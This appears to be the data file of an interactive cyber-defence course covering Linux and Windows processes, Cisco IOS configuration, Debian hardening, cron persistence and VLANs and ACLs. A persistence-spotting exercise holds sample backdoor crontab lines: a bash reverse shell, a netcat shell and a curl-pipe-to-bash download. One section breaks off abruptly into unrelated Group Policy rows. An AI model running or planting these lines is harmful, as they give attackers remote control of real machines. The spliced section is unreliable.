       caption:'For defenders: privileges belong to the process, so a service running as root or SYSTEM gives all of its threads that power. Run services as the least-privileged account that works.',
       alt:'A process is a running program. It owns its memory (code, data, and heap), its open files and network sockets, and a security identity (a user ID or token). The operating system keeps each process’s memory apart. A thread is a path of execution inside a process: each thread has its own stack and registers, and shares everything else its process owns, including its permissions. A crash in one thread can stop the whole process. The figure shows two examples: browser.exe (PID 4120), running as alex with three threads, and sshd (PID 812), running as root. Windows lists processes in Task Manager’s Details tab, where you can add a Threads column; Linux lists processes with ps aux and threads with ps -eLf or top -H.'}),
     TIPS('<b>Permissions belong to the process.</b> Windows gives each process an access token, and Linux gives it user and group IDs. Its threads act with those rights by default; a server thread can briefly borrow a client’s identity, which Windows calls impersonation.',
          '<b>Ports belong to processes too.</b> Each listening socket has an owning process: <code>ss -tulnp</code> names the program and PID behind every port on Linux, and <code>netstat -ano</code> shows the PID on Windows (match it with <code>tasklist</code>). That name is your first clue for remove, harden, or keep.',
          '<b>The account sets the blast radius.</b> A service running as root or SYSTEM gives every one of its threads full control of the machine. Well-built services, such as web servers, keep one small parent process as root to open their port and run the workers that handle requests under a low-privilege account (www-data on Debian and Ubuntu), so ps shows one root process and many www-data ones.',
          '<b>Malware hides in both.</b> It runs as its own process under a harmless-looking name, or starts a thread inside a trusted process (injection). Check the path, the account, and the parent process of anything unexpected.'),
     CMDS('See them for yourself',[
       ['tasklist /svc','Windows: every process with its PID and the services it hosts.'],
       ['Get-Process -IncludeUserName','Windows PowerShell, elevated: each process with the account it runs as.'],
       ['(Get-Process -Id 4120).Threads.Count','Windows PowerShell: the number of threads in one process (use a real PID).'],
       ['ps aux','Linux: every process with its user, PID, CPU, and memory.'],
       ['ps -eLf','Linux: one line per thread; LWP is the thread ID and NLWP the thread count.'],
       ['top -H','Linux: a live view of threads instead of processes (q to quit).']
     ])),
    ANATOMY('Port, service, and process: one listening socket',[
     {name:'Listening socket',tag:'one line of ss -tulnp',tone:'l2',grid:true,
      text:'<code>tcp LISTEN 0 128</code> <code>0.0.0.0:22</code> <code>0.0.0.0:*</code> <code>users:(("sshd",pid=812,fd=3))</code>',
      children:[
        {name:'Protocol',tone:'l1',text:'<code>tcp</code> or <code>udp</code>'},
        {name:'Local address',tone:'l3',text:'<code>0.0.0.0</code> or <code>[::]</code>: every interface<br><code>127.0.0.1</code> or <code>[::1]</code>: this machine alone'},
        {name:'Port',tone:'l2',text:'<code>22</code>: a convention the program chose'},
        {name:'Owning process',tone:'l4',text:'<code>sshd</code>, PID 812: the program that answers'}]}
   ],{intro:'People say port, service, and process as if they were one thing. A listening socket ties them together, and each tool shows a different part of it.',
     label:'A listening socket has four parts: the protocol, the local address, the port number, and the owning process.',
     facts:{head:['','What it is','See it'],rows:[
       ['Port','A number from 1 to 65535 on TCP or UDP. Any program with the rights can listen on any free port, so 22 is a habit rather than a guarantee','<code>ss -tulnp</code>; <code>netstat -ano</code>'],
       ['Service','A program the system starts and keeps running in the background','<code>systemctl</code>; <code>Get-Service</code>'],
       ['Process','The running program, with a PID and an account','<code>ps aux</code>; <code>Get-Process</code>']]},
     note:'A firewall decides who can reach a listener, and the listener keeps running behind it. To close a port for good, stop and disable the service or remove the software.',
     caption:'Trust the owning process over the port number: the number is a convention, and the process shows what really answers.',
     alt:'One line of ss -tulnp reads: tcp, LISTEN, local address 0.0.0.0 port 22, peer 0.0.0.0:*, owned by sshd with PID 812. It has four parts. Protocol: tcp or udp. Local address: 0.0.0.0 or [::] listens on every interface; 127.0.0.1 or [::1] listens for this machine alone. Port: 22, a convention the program chose. Owning process: sshd, PID 812, the program that answers. A port is a number from 1 to 65535 on TCP or UDP; see ports with ss -tulnp on Linux and netstat -ano on Windows. A service is a program the system starts and keeps running in the background; see services with systemctl and Get-Service. A process is the running program, with a PID and an account; see processes with ps aux and Get-Process.'}),
   MATCH('s4m','Match the service to its port','Tap a service, then the port it normally uses.',[
     ['SSH','22'],['Telnet','23'],['FTP','21'],['HTTP','80'],['HTTPS','443'],['DNS','53'],['RDP','3389'],['SMB','445'],['SMTP','25'],['MySQL','3306']
   ]),
   QUIZ('s4q','Check: what would you do?',[
     ['ss -tulnp shows vsftpd listening on 21. Brief: "This machine is a web server." Action?',['Keep it, it is harmless','Disable and remove vsftpd','Change the port to 2121','Add a firewall rule allowing 21'],1,'FTP falls outside the scenario. Remove it, then confirm the web server still works.'],
     ['Brief: "Employees transfer files to this server with FTP." Action?',['Remove FTP anyway','Keep FTP, disable anonymous login, require strong passwords, and restrict users to their home directories','Replace it with Telnet','Open FTP to the internet'],1,'Required service: harden it. In vsftpd.conf that means anonymous_enable=NO, local_enable=YES, chroot_local_user=YES.'],
     ['Windows shows a listener on 5900 owned by winvnc.exe, absent from the brief.',['Leave it, VNC is standard','Uninstall it and check startup and scheduled tasks for anything that re-launches it','Only block port 5900 in the firewall','Rename the process'],1,'Unlisted remote-access software is an unauthorized-software or malware finding. Remove it and its persistence.'],
     ['Which is the usual default firewall posture for a workstation or server?',['Block everything in and out','Default deny inbound, allow outbound, and open only required inbound ports','Allow everything, the OS handles it','Block outbound only'],1,'Blocking all outbound traffic would break updates, DNS, and everything users need. Tighter outbound filtering is possible, but it has to be planned service by service.']
   ]),
   LINKS('Go further',['ubuntu-server','ms-win-sec','cis'])
  ]},
 {id:'s5',title:'Cisco: configure a switch and a router',bloom:'Apply',sum:'The baseline IOS commands for a new switch and router, why each one matters, and how to verify them.',
  blocks:[
   C('Baseline switch configuration','Apply',
     CMDS('From user mode to a saved config',[
       ['enable','User EXEC (>) to privileged EXEC (#).'],
       ['configure terminal','Global configuration mode (config)#.'],
       ['hostname SW1','Match the name in your network documentation exactly; it appears in prompts, logs, and neighbor tables.'],
       ['enable secret Cisco123!','Hashed password for privileged mode (use this instead of enable password).'],
       ['service password-encryption','Obscures the clear-text line passwords in the config (weak, but better than plain text).'],
       ['banner motd #Authorized access only#','Legal notice. Pick a delimiter character that appears nowhere in the text.'],
       ['line console 0','Then: password Cisco123! and login. exit to leave.'],
       ['line vty 0 15','Remote lines. Then: login local and transport input ssh.'],
       ['username admin secret Cisco123!','Local account used by login local.'],
       ['ip domain-name example.com','Required before generating the SSH key.'],
       ['crypto key generate rsa modulus 2048','SSH key pair.'],
       ['ip ssh version 2','SSH version 2 only.'],
       ['interface vlan 1','Management interface (real networks usually move management off VLAN 1). Then: ip address 192.168.1.2 255.255.255.0 and no shutdown.'],
       ['ip default-gateway 192.168.1.1','So the switch can be managed from other networks.'],
       ['copy running-config startup-config','Save to NVRAM. Unsaved changes vanish on reload.']
     ])),
    HIER('IOS command modes: where each command lives',
     {name:'User EXEC',note:'Prompt <code>SW1&gt;</code>: basic monitoring. <code>enable</code> moves down a level',tone:'l1',children:[
       {name:'Privileged EXEC',note:'Prompt <code>SW1#</code>: show, copy, ping, and reload. <code>configure terminal</code> moves down',tone:'l2',children:[
         {name:'Global configuration',note:'Prompt <code>SW1(config)#</code>: hostname, enable secret, username, banner, and ip default-gateway',tone:'l3',children:[
           {name:'Interface configuration',note:'<code>SW1(config-if)#</code>, from <code>interface vlan 1</code>: ip address and no shutdown',tone:'l4'},
           {name:'Line configuration',note:'<code>SW1(config-line)#</code>, from <code>line console 0</code> or <code>line vty 0 15</code>: password, login local, transport input ssh, and exec-timeout',tone:'l4'}]}]}]},
     {intro:'Each prompt tells you where you are. A command typed at the wrong level returns an error, so read the prompt first.',
      note:'<code>exit</code> climbs one level; <code>end</code> or Ctrl+Z jumps straight back to privileged EXEC. In any configuration mode, put <code>do</code> in front of a privileged command (<code>do show ip interface brief</code>) to run it where you are.',
      caption:'Down the tree: enable, configure terminal, then interface or line. The prompt changes at every step.'}),
   SCALE('Cisco password storage, from readable to hard to crack',{from:'Readable',to:'Hard to crack',bands:[
       ['enable password','Clear text: anyone who sees the configuration reads it','bad'],
       ['Type 7','What service password-encryption makes of enable and line passwords: a reversible scramble that free tools undo in seconds','amber'],
       ['Type 5','A salted MD5 hash, the classic form of enable secret and username … secret: one-way, but quick to brute-force','l2'],
       ['Type 8 or 9','Slow, salted hashes (PBKDF2 with SHA-256, or scrypt), chosen with the algorithm-type keyword','ok']]},
     {intro:'The word “encryption” in service password-encryption oversells it. What protects a password is the secret keyword, which stores a hash.',
      note:'When <code>enable secret</code> and <code>enable password</code> both exist, enable secret wins. <code>username admin secret …</code> stores a hash; <code>username admin password …</code> stores clear text or type 7. Example: <code>enable algorithm-type scrypt secret …</code>',
      caption:'Use secret for every password that offers it, and treat service password-encryption as a screen against glances over your shoulder.'}),
   C('Baseline router configuration','Apply',
     CMDS('Interfaces and verification',[
       ['interface gigabitethernet0/0/0','Then: description LAN, ip address 192.168.1.1 255.255.255.0, and no shutdown.'],
       ['show ip interface brief','Interface status and addresses. up/up is the goal.'],
       ['show running-config','What is configured now. show startup-config is what is saved.'],
       ['show vlan brief','Switch: VLANs and port assignments.'],
       ['show mac address-table','Switch: learned MAC addresses.'],
       ['ping 192.168.1.10','Verify from the device. Also from a PC: ping its gateway.'],
       ['exec-timeout 5 0','Under line console/vty: log out idle sessions after 5 minutes.']
     ])),
    PATH('One LAN, worked addresses: PC, switch, and router',[
     {name:'PC',tag:'192.168.1.10/24',tone:'l1',note:['Gateway: 192.168.1.1','Sends traffic for other networks to its gateway'],via:'Frame to the router’s MAC'},
     {name:'SW1',tag:'Layer 2 switch',tone:'l2',note:['Forwards frames by MAC address','Management IP 192.168.1.2 on interface vlan 1','Gateway 192.168.1.1, so admins on other networks reach it'],via:'Same frame, out the port to R1'},
     {name:'R1',tag:'Layer 3 router',tone:'l3',note:['g0/0/0: 192.168.1.1, the gateway for this LAN','Each interface sits in its own network','Routes packets by destination IP to other networks']}
   ],{intro:'Both devices take an IP address, for different reasons. The switch’s address is a handle for managing it; the router’s addresses are the gateways that traffic flows through.',
     caption:'The PC (.10) and the switch (.2) both use the router (.1) as their gateway. Frames cross the switch; packets cross the router. Check them with show mac address-table on SW1 and show ip route on R1.'}),
   PATH('running-config and startup-config: where a change lives',[
     {name:'You type a command',tag:'(config)#',tone:'muted',note:'It takes effect at once',via:'Changes'},
     {name:'running-config',tag:'RAM',tone:'l2',note:['The configuration in effect now','<code>show running-config</code>','Cleared by a reload or power loss'],via:'Save'},
     {name:'startup-config',tag:'NVRAM',tone:'ok',note:['The saved configuration','<code>show startup-config</code>','Survives a reload'],via:'Loads at boot'},
     {name:'running-config after a reload',tag:'RAM',tone:'l2',note:'Matches the last save, exactly'}
   ],{intro:'Every command changes the device the moment you press Enter, and the change stays in RAM until you save it.',
     note:'Save with <code>copy running-config startup-config</code>: the copy command reads source first, destination second. The reverse order merges the saved file into what is running, so check the order before you press Enter. <code>write memory</code> is the older way to save.',
     caption:'Save after each block of changes. A reload before saving discards everything since the last save.'}),
   QUIZ('s5q','Check: IOS',[
     ['You configured an IP address on interface vlan 1 but pings to the switch still fail. Most likely missing?',['enable secret','no shutdown on the interface','service password-encryption','a banner'],1,'The interface is still down. no shutdown brings it up. Check with show ip interface brief.'],
     ['Which command makes the vty lines use the local username database?',['login','login local','password cisco','transport input ssh'],1,'login alone uses the line password; login local uses username/secret entries.'],
     ['The switch reloaded and your configuration is gone. What was missed?',['enable secret','copy running-config startup-config','show vlan brief','exec-timeout'],1,'The running-config lives in RAM. Save it to NVRAM (the startup-config) so it survives a reload.'],
     ['Why enable secret rather than enable password?',['It is shorter','enable secret stores a hash; enable password is clear text or weakly reversible','They are the same','enable password is newer'],1,'Config Audit will show you this one in the wild: an enable password line is a finding.']
   ]),
   LINKS('Go further',['t4t-ios','t4t-audit','t4t-ld-ios','t4t-lr-ios','netacad','pt'])
  ]},
 {id:'s6',title:'Investigation questions and the change log',bloom:'Apply',sum:'How to answer exactly, the commands that find things, and the one habit that makes every teammate better.',
  blocks:[
   C('Answering an investigation question','Understand',
     TIPS('Read the whole question twice. Note the <b>exact format</b> requested: hash algorithm, full path or just a name, user name or UID, and date format.',
          'Write the answer where the question file asks (often an <code>ANSWER:</code> line), exactly as asked, and leave the rest of that file untouched.',
          'Typical asks: find a file by name or content, hash a file, identify the user who owns or created something, find a process or listening port, decode text, or read a log entry.',
          'If it feels like a trick, it is usually a format trick (MD5 vs SHA-256, with or without the extension).'),

     ['Run gpupdate /force on the DC','Apply immediately instead of waiting for the refresh cycle.'],
     ['Verify with Get-ADDefaultDomainPasswordPolicy','Prove the change took effect before moving on.']
   ]),
   QUIZ('j2q','Check: Group Policy',[
     ['A setting in the Default Domain Policy is missing on a workstation. First command?',['shutdown /r','gpupdate /force then gpresult /r','net accounts','ipconfig /flushdns'],1,'Force the refresh, then confirm what applied. gpresult /r shows which GPOs won.'],
     ['Which policy area would you use to stop a normal user from logging on locally to the DC?',['Password Policy','User Rights Assignment','Windows Update','Firewall'],1,'User Rights Assignment controls "Allow/Deny log on locally" and similar rights.'],
     ['Domain password policy belongs in',['each local machine’s secpol','the Default Domain Policy GPO','the hosts file','Task Scheduler'],1,'One GPO at the domain level governs every domain account.'],
     ['gpresult /r is for',['forcing a policy refresh','showing which policies are applied here','creating a GPO','editing the registry'],1,'It reports applied policy. gpupdate applies; gpresult reports.']
   ]),
   LINKS('Go further',['ms-winsrv','ms-baselines','stig','t4t-ld-winsrv'])
  ]},
 {id:'j3',title:'Debian and deeper Linux',bloom:'Analyze',sum:'What differs from Mint and Ubuntu, plus auditing, logging, cron, kernel parameters, and finding persistence.',
  blocks:[
   C('Debian differences and deeper hardening','Analyze',
     TIPS('Debian (12 "bookworm", 13 "trixie") is close to Ubuntu but leaner. New installs ship without rsyslog; logs live in the systemd journal, so use <code>journalctl</code> rather than /var/log/auth.log. Some setups use a custom admin group; confirm with <code>sudo -l</code> and <code>/etc/sudoers</code>.',
          'The default install ships without a firewall front end: ufw may be absent. Check with <code>which ufw</code>; nftables is the native packet filter.',
          'Services you may meet: Apache or nginx, MySQL/MariaDB, Samba, Postfix, vsftpd, and Bind9. Harden the ones the brief keeps.',
          'Think first in the six areas (accounts, access, configuration, patching, malware and persistence, and logging) and in commands second.'),
     CMDS('Audit and investigate',[
       ['sudo journalctl -p err -b','Errors since boot. Add --since "1 hour ago" to narrow.'],
       ['sudo journalctl -u ssh --since today','Logs for one service.'],
       ['systemctl list-unit-files --state=enabled','What starts at boot. Keep enabled only what the brief needs.'],
       ['crontab -l; sudo crontab -l','User and root cron jobs. Also check /etc/cron.* and /etc/crontab for rogue entries.'],
       ['ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly','Cron drop-in directories: a classic persistence spot.'],
       ['sudo grep -R "" /etc/systemd/system/*.service 2>/dev/null | grep -i exec','Look at ExecStart lines for odd commands in custom units.'],
       ['sudo ss -tulnp','Listening sockets with process. Match to the services you expect.'],
       ['sudo lsof -i -nP 2>/dev/null','Every network connection by process, confirming what ss shows.'],
       ['sudo find / -newermt "2026-01-01" -type f 2>/dev/null | grep -vE "^/proc|^/sys"','Files changed after a date: scoping recent tampering.']
     ])),
    ANATOMY('One crontab line: five time fields, then the command',[
     {name:'A crontab line',tag:'crontab -l',tone:'l3',children:[
       {name:'Schedule',tag:'five time fields',tone:'l2',grid:true,children:[
         {name:'Minute',tag:'0–59',tone:'l1',text:'<code>30</code> at minute 30'},
         {name:'Hour',tag:'0–23',tone:'l1',text:'<code>3</code> in the 03:00 hour'},
         {name:'Day of month',tag:'1–31',tone:'l1',text:'<code>*</code> any day'},
         {name:'Month',tag:'1–12',tone:'l1',text:'<code>*</code> every month'},
         {name:'Day of week',tag:'0–7',tone:'l1',text:'<code>1</code> Monday (0 and 7 are Sunday)'}]},
       {core:true,name:'Command',sub:'<code>/usr/local/bin/backup.sh</code>, run through /bin/sh as the crontab’s owner'}]}
   ],{intro:'Read the time fields left to right: minute, hour, day of month, month, and day of week. A <code>*</code> means every value, <code>*/5</code> means every fifth one, and <code>@reboot</code> replaces all five fields with “once, when cron starts at boot”.',
     label:'A crontab line has five time fields (minute, hour, day of month, month, and day of week) followed by the command it runs. This one runs a backup script at 03:30 every Monday.',
     strip:['This line','30 3 * * 1 backup.sh','30 3 * * 1 /usr/local/bin/backup.sh runs the backup script at 03:30 every Monday.'],
     facts:{head:['Where','What to know'],rows:[
       ['Per-user crontabs','<code>crontab -l</code> and <code>sudo crontab -l</code> list them; Debian and Ubuntu keep one file per user in <code>/var/spool/cron/crontabs</code>. Five fields, then the command, run as that user.'],
       ['System crontab','<code>/etc/crontab</code>: a sixth field names the user, before the command.'],
       ['Drop-in files','<code>/etc/cron.d/</code>: the same format as /etc/crontab, user field included.'],
       ['Period folders','<code>/etc/cron.hourly</code>, <code>cron.daily</code>, <code>cron.weekly</code>, and <code>cron.monthly</code> hold plain scripts; run-parts runs each one on that period.'],
       ['systemd timers','<code>systemctl list-timers</code>: a second scheduler to check alongside cron.']]},
     note:'<b>Persistence lives in every one of these places.</b> <code>@reboot</code> lines and short intervals such as <code>* * * * *</code> deserve a close look, especially when the command reaches out to the network.',
     caption:'Five time fields, then the command. System files under /etc add a user field before the command.'}),
   C('Kernel and logging baseline','Apply',
     CMDS('sysctl, auditd, and the journal',[
       ['sudo sysctl -w net.ipv4.conf.all.rp_filter=1','Reverse-path filtering (anti-spoofing). Persist in a file under /etc/sysctl.d/.'],
       ['sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1','Ignore broadcast pings (smurf protection).'],
       ['sudo sysctl -w kernel.randomize_va_space=2','Full ASLR, a memory-corruption mitigation.'],
       ['sudo apt install auditd && sudo systemctl enable --now auditd','Kernel audit logging of security events.'],
       ['journalctl --list-boots','More than one boot listed means the journal survives reboots. If only one appears, set Storage=persistent in /etc/systemd/journald.conf and restart systemd-journald.']
     ])),
    COMPARE('Now or for good: runtime and persistent changes',[
     {name:'Runtime',tag:'now, until reboot',tone:'amber',
      svg:{label:'A runtime change takes effect at once and is gone after a reboot.',
       body:'<path d="M8 38 H192" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><path d="M30 38 H108" fill="none" stroke="var(--amber)" stroke-width="5"/><circle cx="30" cy="38" r="6" fill="var(--amber)"/><text x="30" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">set</text><path d="M114 12 V60" fill="none" stroke="var(--ink-2)" stroke-width="1.5" stroke-dasharray="3 3"/><text x="114" y="72" text-anchor="middle" font-size="10" fill="var(--ink-2)">reboot</text><text x="158" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">gone</text><path d="M150 31 L166 47 M166 31 L150 47" fill="none" stroke="var(--bad)" stroke-width="2.5"/>'},
      rows:[['Kernel setting','<code>sysctl -w name=value</code>'],
            ['Service','<code>systemctl start</code> or <code>stop</code> changes it now'],
            ['Journal','<code>/run/log/journal</code>: kept in memory, cleared at reboot'],
            ['Cisco IOS','running-config, in RAM'],
            ['Check it','<code>sysctl name</code>; <code>systemctl is-active ssh</code>']],
      hook:'writing on a whiteboard that is wiped every night.'},
     {name:'Persistent',tag:'survives a reboot',tone:'ok',
      svg:{label:'A persistent change is still in effect after a reboot.',
       body:'<path d="M8 38 H192" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><path d="M30 38 H190" fill="none" stroke="var(--ok)" stroke-width="5"/><circle cx="30" cy="38" r="6" fill="var(--ok)"/><text x="30" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">set</text><path d="M114 12 V60" fill="none" stroke="var(--ink-2)" stroke-width="1.5" stroke-dasharray="3 3"/><text x="114" y="72" text-anchor="middle" font-size="10" fill="var(--ink-2)">reboot</text><text x="158" y="22" text-anchor="middle" font-size="11" fill="var(--ink)">still set</text>'},
      rows:[['Kernel setting','A line in <code>/etc/sysctl.d/99-hardening.conf</code>; <code>sysctl --system</code> loads it now too'],
            ['Service','<code>systemctl enable</code> or <code>disable</code> sets what starts at boot'],
            ['Journal','<code>/var/log/journal</code>, with <code>Storage=persistent</code> in journald.conf'],
            ['Cisco IOS','startup-config, in NVRAM: <code>copy running-config</code> <code>startup-config</code>'],
            ['Check it','The file itself; <code>systemctl is-enabled ssh</code>; <code>journalctl --list-boots</code>']],
      hook:'writing it in the binder.'}
   ],{intro:'The same idea runs through four tools: one command changes the running system, and another records the change so it returns after a reboot. A hardening fix needs both.',
     note:'<b>Do both at once:</b> <code>systemctl enable --now</code> starts a service and sets it to start at boot; <code>disable --now</code> stops it and keeps it off at boot; <code>mask</code> blocks it from starting at all.',
     caption:'Runtime changes act now and vanish at reboot; persistent changes are read again at every boot. Make the change, then save it.',
     bloom:'Apply'}),
   SPOT('j3sp','Spot the persistence: crontab -l','Tap every line that looks like a backdoor or seems out of place, then Check.',[
     ['# m h  dom mon dow   command',null],
     ['0 3 * * * /usr/bin/apt-get update',null],
     ['*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\'','A reverse shell every five minutes. Remove it and hunt for whatever installed it.'],
     ['0 2 * * 0 /usr/local/bin/backup.sh',null],
     ['@reboot nc -lvp 1337 -e /bin/bash','A netcat backdoor that re-opens on every reboot. Remove.'],
     ['30 1 * * * certbot renew --quiet',null],
     ['* * * * * curl -s http://malware.example/x.sh | bash','Downloads and runs a script every minute (malware.example is a reserved example name). Remove immediately.']
   ]),
   QUIZ('j3q','Check: deeper Linux',[
     ['On a fresh Debian install, /var/log/auth.log is missing. Where do you read authentication events?',['It is impossible','journalctl, the systemd journal','/etc/passwd','dmesg only'],1,'Since Debian 12, the default install leaves out rsyslog, so Debian logs to the journal. For SSH logins use journalctl -u ssh. (Filtering on the process name sshd misses them on Debian 13: since OpenSSH 9.8 they come from sshd-session.)'],
     ['A cron line runs bash -i >& /dev/tcp/.../4444. This is',['A backup','A reverse shell backdoor','A system update','A log rotation'],1,'That is an attacker call-home. Remove the line and investigate how it got there (check all cron dirs, systemd units, and .bashrc).'],
     ['Which sysctl helps against IP address spoofing?',['kernel.randomize_va_space','net.ipv4.conf.all.rp_filter','vm.swappiness','fs.file-max'],1,'rp_filter drops packets whose return route to the source uses a different interface.'],
     ['Best single command to see what is listening and which process owns it?',['ps aux','sudo ss -tulnp','top','df -h'],1,'ss -tulnp ties ports to processes, the question you ask on every machine.']
   ]),
   LINKS('Go further',['debian-handbook','debian-security','debian-wiki','cis','stig','explainshell','t4t-lr-linux'])
  ]},
 {id:'j4',title:'Cisco: VLANs, routing, and ACLs',bloom:'Apply',sum:'Segment a network with VLANs, route between them, and filter traffic with access lists.',
  blocks:[
   C('VLANs and trunks','Apply',
     CMDS('Segment the switch',[
       ['vlan 10','Create a VLAN. Then: name SALES'],
       ['interface range fastethernet0/1 - 8','Several ports at once.'],
       ['switchport mode access','These are host ports; the trunk is configured separately.'],
       ['switchport access vlan 10','Put the ports in VLAN 10.'],
       ['interface gigabitethernet0/1','The link to the router or another switch.'],
       ['switchport mode trunk','Carry multiple VLANs over one link.'],
       ['switchport trunk allowed vlan 10,20','Only the VLANs you intend. Fewer VLANs on a trunk means less exposure.'],
       ['show vlan brief','Verify port-to-VLAN assignments.'],
       ['show interfaces trunk','Verify the trunk and allowed VLANs.']
     ])),
    ANATOMY('One switch, two networks: each VLAN is its own broadcast domain',[
     {name:'Switch SW1',tag:'one physical box · layer 2',tone:'muted',grid:true,
      panel:['Between the VLANs','Only a layer 3 hop: a router or a layer 3 switch'],
      children:[
        {name:'VLAN 10 · SALES',tag:'192.168.10.0/24',tone:'l1',text:'Ports Fa0/1–8<br>PC-A 192.168.10.20<br>Gateway 192.168.10.1'},
        {name:'VLAN 20',tag:'192.168.20.0/24',tone:'l3',text:'Ports Fa0/9–16<br>PC-B 192.168.20.30<br>Gateway 192.168.20.1'}]}
   ],{intro:'Putting ports in different VLANs splits one switch into separate layer 2 networks. Each VLAN gets its own IP subnet and its own default gateway.',
     label:'One switch holds two VLANs. VLAN 10 uses 192.168.10.0/24 and VLAN 20 uses 192.168.20.0/24. Traffic between them needs a router or a layer 3 switch.',
     facts:{head:['','Inside one VLAN','Between two VLANs'],rows:[
       ['Forwarded by','The switch, by destination MAC','A router or layer 3 switch, by destination IP'],
       ['Broadcasts (ARP, DHCP)','Reach every port in the VLAN','Stop at the VLAN’s edge'],
       ['Addressing','One subnet','Two subnets'],
       ['A host sends to','The other host’s MAC','Its default gateway']]},
     note:'<b>A trunk joins switches, and each VLAN keeps its identity across it.</b> VLAN 10 on one switch and VLAN 10 on the next form one VLAN; VLAN 10 and VLAN 20 stay separate on every switch until a layer 3 device routes between them.',
     key:[['l1','VLAN 10'],['l3','VLAN 20'],['muted','The physical switch']],
     caption:'Same box, separate networks: a switch forwards frames only within a VLAN.'}),
   COMPARE('Access port and trunk port: untagged and tagged frames',[
     {name:'Access port',tag:'switchport mode access',tone:'l1',
      svg:{label:'An Ethernet frame on an access port: destination MAC, source MAC, type, data, and FCS, untagged.',
       body:'<g font-size="9" text-anchor="middle" fill="var(--ink)"><rect x="4" y="20" width="46" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="27" y="38">Dst MAC</text><rect x="50" y="20" width="46" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="73" y="38">Src MAC</text><rect x="96" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="111" y="38">Type</text><rect x="126" y="20" width="42" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="147" y="38">Data</text><rect x="168" y="20" width="28" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="182" y="38">FCS</text></g><text x="100" y="66" text-anchor="middle" font-size="10" fill="var(--ink-2)">untagged: a plain Ethernet frame</text>'},
      rows:[['Carries','One VLAN: <code>switchport access vlan 10</code>'],
            ['Frames','Untagged; the host sees a plain Ethernet frame'],
            ['Connects','An end device, such as a PC, a printer, or a server'],
            ['Verify','<code>show vlan brief</code>']],
      hook:'a door into one room.'},
     {name:'Trunk port',tag:'switchport mode trunk',tone:'l3',
      svg:{label:'An Ethernet frame on a trunk: a 4-byte 802.1Q tag holding the VLAN ID sits between the source MAC and the type field.',
       body:'<g font-size="9" text-anchor="middle" fill="var(--ink)"><rect x="4" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="19" y="38">Dst</text><rect x="34" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="49" y="38">Src</text><rect x="64" y="16" width="46" height="36" fill="var(--amber-bg)" stroke="var(--amber)" stroke-width="2.5"/><text x="87" y="32" font-weight="700">802.1Q</text><text x="87" y="44">VLAN 10</text><rect x="110" y="20" width="32" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="126" y="38">Type</text><rect x="142" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="157" y="38">Data</text><rect x="172" y="20" width="24" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="184" y="38">FCS</text></g><text x="87" y="10" text-anchor="middle" font-size="9" fill="var(--ink-2)">4-byte tag</text><text x="100" y="66" text-anchor="middle" font-size="10" fill="var(--ink-2)">tagged: the VLAN ID rides in the frame</text>'},
      rows:[['Carries','Several VLANs: <code>switchport trunk allowed vlan 10,20</code>'],
            ['Frames','Tagged with a 4-byte 802.1Q tag, inserted after the source MAC'],
            ['Inside the tag','TPID 0x8100, a 3-bit priority, a 1-bit DEI, and a 12-bit VLAN ID (1–4094)'],
            ['Connects','Another switch, or a router doing router-on-a-stick'],
            ['Verify','<code>show interfaces trunk</code>']],
      hook:'a hallway where every frame wears its room number.'}
   ],{intro:'The cable and the port look the same; the difference lives in the frames: frames on a trunk carry an extra 4-byte tag that names their VLAN, and frames on an access port travel plain.',
     note:'<b>Native VLAN:</b> one VLAN per trunk crosses untagged, VLAN 1 unless you change it. Set the same native VLAN on both ends, use an otherwise unused VLAN for it, and keep user traffic off it.',
     caption:'The switch adds the tag as a frame leaves on a trunk and removes it before the frame leaves an access port.',
     bloom:'Apply'}),
   C('Inter-VLAN routing and ACLs','Apply',
     CMDS('Route, then filter',[
       ['interface gigabitethernet0/0/0.10','Router subinterface for VLAN 10 (router-on-a-stick).'],
       ['encapsulation dot1q 10','Tag this subinterface for VLAN 10.'],
       ['ip address 192.168.10.1 255.255.255.0','Gateway for VLAN 10 hosts.'],
       ['access-list 10 permit 192.168.10.0 0.0.0.255','Standard ACL: match a source network with a wildcard mask (inverse of the subnet mask).'],
       ['ip access-list extended BLOCK_TELNET','Named extended ACL for protocol/port control.'],
       ['deny tcp any any eq 23','Inside the named ACL: block Telnet everywhere.'],
       ['permit ip any any','End with a permit when you only mean to block some traffic, or the implicit deny drops everything.'],
       ['interface gigabitethernet0/0/0.10','Apply the ACL: then ip access-group BLOCK_TELNET in'],
       ['show access-lists','Verify ACLs and hit counts.'],
       ['show ip route','Verify routing, including connected VLAN subnets.']
     ]),
     NOTE('Every ACL ends with an invisible <code>deny any</code>. If you only write deny statements, you block all traffic. Order matters: the first match wins.')),
    PATH('Router-on-a-stick: up the trunk tagged 10, back down tagged 20',[
     {name:'PC-A',tag:'VLAN 10 · 192.168.10.20',tone:'l1',note:'Sees 192.168.20.30 on another subnet, so it sends the frame to its gateway, 192.168.10.1',via:'Untagged, on an access port'},
     {name:'Switch',tag:'layer 2',tone:'l1',note:'Knows the frame is in VLAN 10 from the access port, and sends it out the trunk',via:'Tagged 10 on the trunk'},
     {name:'Router: Gi0/0/0.10 to Gi0/0/0.20',tag:'layer 3',tone:'l4',note:['Accepts the frame on the subinterface whose <code>encapsulation dot1q 10</code> matches the tag','An inbound ACL on .10 checks the packet here, before routing','Routes it to 192.168.20.0/24 and builds a new frame for VLAN 20'],via:'Tagged 20, back down the same trunk'},
